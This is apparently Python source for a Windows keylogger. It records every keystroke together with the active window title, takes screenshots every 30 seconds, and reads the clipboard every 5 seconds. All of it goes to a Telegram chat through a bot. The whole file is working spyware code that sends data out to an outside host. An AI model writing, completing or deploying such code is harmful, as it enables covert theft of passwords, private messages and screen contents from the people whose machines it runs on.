import asyncio
from datetime import datetime
import win32api
import win32gui
from helpers import get_key_representation, capture_screenshot, get_clipboard_content, log_error

keystroke_buffer = []

async def capture_keystrokes(bot):
    global keystroke_buffer
    while True:
        await asyncio.sleep(0.01)
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        is_shift_active = win32api.GetKeyState(0x10) & 0x8000 != 0
        timestamp = datetime.now().strftime("[%H-%M-%S]")

        for key_code in range(256):
            if win32api.GetAsyncKeyState(key_code) & 1:
                keystroke = f"{timestamp} |{window_title.strip()}|  ({get_key_representation(key_code, is_shift_active)})"
                keystroke_buffer.append(keystroke)
                print(f"Key captured: {keystroke}") 

async def send_keystrokes_to_telegram(bot):
    global keystroke_buffer
    while True:
        await asyncio.sleep(1)
        if keystroke_buffer:
            try:
                await bot.send_message(chat_id="131933xxxx", text="\n".join(keystroke_buffer)) # ID Chat
                keystroke_buffer.clear()
            except Exception as e:
                log_error(f"Error sending key presses: {e}")

async def capture_screenshots(bot):
    while True:
        await asyncio.sleep(30)
        try:
            screenshot_path = capture_screenshot()
            await bot.send_photo(chat_id="131933xxxx", photo=open(screenshot_path, 'rb')) # ID Chat
        except Exception as e:
            log_error(f"Error capturing and sending the screen: {e}")

async def log_clipboard(bot):
    previous_content = ""
    while True:
        await asyncio.sleep(5)  
        current_content = get_clipboard_content()
        if current_content != previous_content:
            previous_content = current_content
            await bot.send_message(chat_id="131933xxxx", text=f"Clipboard content: {current_content}") # ID Chat
